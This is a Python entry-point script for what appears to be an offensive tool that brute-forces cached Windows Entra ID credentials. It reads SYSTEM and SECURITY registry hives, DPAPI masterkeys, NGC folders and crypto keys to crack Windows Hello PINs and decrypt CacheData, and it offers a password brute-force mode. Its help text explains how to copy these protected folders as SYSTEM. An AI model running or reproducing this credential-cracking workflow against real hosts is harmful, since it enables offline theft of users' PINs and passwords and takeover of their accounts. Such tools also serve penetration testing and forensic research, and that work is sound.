import argparse
import os
from scripts import parser_data
from scripts import cryptokeys_decrypt
from scripts import bruteforce_password
from scripts import decrypt_cachedata_pin
from scripts import parse_cachedata
from scripts import dump_cachedata

def list_of_args():
   parser = argparse.ArgumentParser(add_help = True, description = "CacheData bruteforcer. On a live windows host, to copy the folders with all subfolders and files: xcopy <folder> <destination> /H /E /G /C as SYSTEM. The script will automatically iterates on each Entra ID user who has logged in on the device. If you want to bruteforce the PIN for only one user, use the --sid parameter.")
   subparsers = parser.add_subparsers(dest='operation', help='Available subparser (pin or password)')

   # Dump the entries from the CacheData file
   dump_parser = subparsers.add_parser('dump', help='Dump CacheData file entries.')
   dump_parser.add_argument('-C', dest = 'CacheData', action="store", required=True, help="CacheDataFile")

   # The CacheData contains an entry protected by a PIN, try to bruteforce the PIN
   pin_parser = subparsers.add_parser('pin', help='BF pin.')
   pin_parser.add_argument('-C', dest = 'CacheData', action = "store",required=True, help= "CacheDataFile")
   pin_parser.add_argument('-N', dest = 'NGC', action = "store", required=True, help= "NGC folder (C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc\\")
   pin_parser.add_argument('-P', dest = 'PINFile', action ="store", required=True , help="PIN list for bruteforce")
   pin_parser.add_argument('--masterkey', dest='masterkeydir', action="store", required=True, help='System Masterkey folder (C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\')
   pin_parser.add_argument('--system', dest='system', required=True, help='SYSTEM file (C:\\Windows\\System32\\config\\SYSTEM)')
   pin_parser.add_argument('--security', dest='security', required=True, help='SECURITY file (C:\\Windows\\System32\\config\\SECURITY)')
   pin_parser.add_argument('--keys', dest='keys', required=True, help='Keys folder (C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys\\)')
   pin_parser.add_argument('--verbose', dest='verbose', required=False, action="store_true", help='Verbose mode')
   pin_parser.add_argument('--sid', dest='sid', nargs='?', default='', help='Bruteforce only one user specifying its SID. reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList. SID related to Entra ID users begin by S-1-12-1.')

   # The CacheData file contains an entry protected by a password
   password_parser = subparsers.add_parser('password', help='BF password.')
   password_parser.add_argument('-C', dest = 'CacheData', action = "store",required=True, help= "CacheDataFile")
   password_parser.add_argument('-P', dest = 'PasswordsFile', action ="store",required=True , help="Passwords file")
   password_parser.add_argument('--verbose', dest='verbose', required=False, action="store_true", help='Verbose mode')

   options = parser.parse_args()
   if options.operation == 'dump':
      pass
   elif options.operation == 'pin':
      options.pins = parser_data.fileToList(options.PINFile)
   elif options.operation == 'password':
      options.passwords = parser_data.fileToList(options.PasswordsFile)
   else:
      parser.print_help()
   return options


def main(arguments):

      if arguments.operation == 'dump':
         dump_cachedata.dump_cache_data(arguments.CacheData)

      elif arguments.operation == 'pin':
         NGC = parser_data.extract_NGC_data(arguments)

         arrGUIDs = os.listdir(arguments.NGC)
         arrProtectors = NGC[0]
         arrItems = NGC[1]
         first_protector = arrProtectors[0][2]

         bInputData = None
         for arrProtector in arrProtectors:
            # Microsoft Software Key Storage Provider is used when no TPM is available
            if arrProtector[1] == 'Microsoft Software Key Storage Provider': 
               bInputData = arrProtector[3]
               break
         if bInputData is None:
            print('[-] Could not find Microsoft Software Key Storage Provider in protectors')
            return

         # Bruteforce using the PIN and get a first RSA private key (BCRYPT_RSAKEY_BLOB structure)
         rsa_priv_key_blob1 = cryptokeys_decrypt.cryptokeys_decrypt(arguments, first_protector, bf = True)
         # If we couldn't obtain the private key because the bruteforce failed, then leave
         if rsa_priv_key_blob1 is None:
            return
         # Obtain the DecryptPin which is RSA encrypted with the RSA private key obtained previously
         decryptPin = parser_data.extract_decryptPin(rsa_priv_key_blob1, bInputData, arguments.verbose)

         for item in arrItems:
            if item[1] == '//CA00CFA8-EB0F-42BA-A707-A3A43CDA5BD9':
               # Use the DecryptPin from the previous step as the "new pin"
               arguments.pins = [decryptPin.hex().lower()]
               # Obtain a second RSA private key (BCRYPT_RSAKEY_BLOB structure) using the DecryptPin
               rsa_priv_key_blob2 = cryptokeys_decrypt.cryptokeys_decrypt(arguments, item[3], bf = False)
               decrypt_cachedata_pin.decrypt_cachedata_with_private_key(arguments.CacheData, rsa_priv_key_blob2)

      elif arguments.operation == 'password':
         bruteforce_password.bruteforce(arguments)


if __name__ == '__main__':
   main(list_of_args())
